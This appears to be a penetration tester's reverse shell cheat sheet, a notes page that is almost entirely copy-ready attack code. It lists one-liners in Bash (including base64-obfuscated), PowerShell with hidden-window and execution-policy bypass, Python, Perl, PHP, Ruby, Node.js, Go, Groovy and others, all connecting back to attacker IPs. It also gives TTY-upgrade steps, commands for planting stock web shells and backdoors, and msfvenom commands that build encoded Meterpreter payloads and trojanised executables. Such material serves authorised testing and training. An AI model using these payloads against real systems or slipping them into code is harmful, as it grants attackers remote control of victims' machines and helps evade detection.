---
layout: notes
permalink: /notes/cheat/shell/
title: Reverse Shells Cheat Sheet
---

# Reverse Shells Cheat Sheet

### Online Reverse Shell Generators 
[https://www.revshells.com/](https://www.revshells.com/)

### Upgrate Reverse Shell to Interactive TTYs
```bash
#---Python---
python -c 'import pty; pty.spawn("/bin/bash")'

#---Socat---
#Kali
socat file:`tty`,raw,echo=0 tcp-listen:4444
#Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

#---SSTY---
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
# In Kali
$ stty raw -echo
$ fg
# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

## Basic Reverse Shells

### Bash
```bash
#bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1

#bash in Base64
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
```

### Powershell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
```

### Socat
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
#Windows
socat.exe -d -d TCP4:10.0.0.1:4444 EXEC:'cmd.exe',pipes

#Kali: 
socat -d -d TCP-LISTEN:4443,fork STDOUT
#Victim: 
socat TCP:KALI_IP:4443 EXEC:/bin/bash
```

### Telnet
```bash
rm -f /tmp/p; mknod /tmp/p p && telnet 10.0.0.1 4444 0/tmp/p
```

### AWK
```bash
awk 'BEGIN {{s = "/inet/tcp/0/10.0.0.1/4444"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null
```

### Netcat
```bash
nc -e /bin/sh 10.0.0.1 1234

#Victim: 
ncat -lvnp 1234 -e /bin/bash
#Kali: 
nc VICTIM_IP 1234
```

### Python
```python
python -c '
​import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
​'
```

### Perl
```perl
perl -e '
​use Socket;
$i="10.0.0.1";
$p=1234;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
  open(STDIN,">&S");
  open(STDOUT,">&S");
  open(STDERR,">&S");
  exec("/bin/sh -i");
};
​'
```

### PHP
```php
php -r '
​$sock=fsockopen("10.0.0.1",1234);
exec("/bin/sh -i <&3 >&3 2>&3");
​'
```

### Ruby
```ruby
ruby -rsocket -e'
​f=TCPSocket.open("10.0.0.1",1234).to_i;
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f);
​'
```

### Java
```java
r = Runtime.getRuntime();
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);
p.waitFor();
```

### Node.js
```javascript
(function(){{var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(4444,"10.0.0.1",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();
```

### Golang
```go
echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","10.0.0.1:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### Groovy Script
```bash
String host = "10.8.10.235";
int port = 4445;
String cmd = "/bin/bash";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (pe.available() > 0) so.write(pe.read());
    while (si.available() > 0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
}
p.destroy();
s.close();
```

## Web Shells (Kali) 
```bash
#JSP
cp /usr/share/webshells/jsp/cmdjsp.jsp cmd.jsp

#ASP
cp /usr/share/webshells/asp/cmdasp.asp cmd.asp

#ASP
cp /usr/share/webshells/asp/cmd-asp-5.1.asp cmd.asp

#ASPX
cp /usr/share/webshells/aspx/cmdasp.aspx cmd.aspx

#PHP
cp /usr/share/webshells/php/simple-backdoor.php cmd.php

#PHP
cp /usr/share/webshells/php/qsd-php-backdoor.php cmd.php

#PHP
cp /usr/share/webshells/php/php-backdoor.php cmd.php

#Perl (CGI)
cp /usr/share/webshells/perl/perlcmd.cgi cmd.cgi
```

## msfvenom Reverse Shells 
```bash
#---Windows X86---
#Reverse TCP Shell
msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_tcp LHOST=<< >> LPORT=443 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe -o payload.exe
#Reverse HTTP Shell 
msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_http LHOST=<<>> LPORT=443 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe -o payload.exe
#Reverse HTTPS Shell 
msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_https LHOST=<<>> LPORT=443 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe -o payload.exe
#Reverse UDP Shell 
msfvenom -a x86 –platform Windows -p payload/windows/shell/reverse_udp LHOST=<<>>  LPORT=443 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe -o payload.exe

#Windows non staged reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe

#Windows Staged (Meterpreter) reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe

#Windows Python reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py

#Windows ASP reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp

#Windows ASPX reverse shell
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx

#Windows JavaScript reverse shell with nops
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18

#Windows Powershell reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1

#Windows reverse shell excluding bad characters
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai

#Windows x64 bit reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe

#Windows reverse shell embedded into plink
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

#PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php

#Java WAR reverse shell
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war

#Linux bind shell
msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai

#Linux FreeBSD reverse shell
msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf

#Linux C reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c
```

### Reverse Shell Collections
[https://github.com/tennc/webshell](https://github.com/tennc/webshell)

### ICMP Reverse Shell
[https://github.com/krabelize/icmpdoor](https://github.com/krabelize/icmpdoor)

### Reverse Shell over the Internet (NGROK)
[How to catch a reverse shell over the internet](https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9)